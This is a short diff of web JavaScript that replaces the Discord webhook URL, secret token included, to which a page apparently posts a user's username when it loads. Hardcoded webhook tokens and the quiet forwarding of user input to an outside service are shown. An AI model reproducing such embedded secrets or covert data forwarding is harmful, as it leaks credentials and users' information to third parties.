@@ -96,7 +96,7 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             // Log username to Discord
-            await fetch('https://discord.com/api/webhooks/1250487185451389038/vr2gBs7BKLWW9mrVl5jLduoTqbj0lvjNhS2k6q5lT3rsz0sbBovuCTAw3OPDScypUzso', {
+            await fetch('https://discord.com/api/webhooks/1250487187489947851/wDyA2tTG6aqE8JKpQ2CvImu7LOzIbx08Vqm_6Z3G5Uw68I9qwFyMums9vNrPfUIml3iw', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
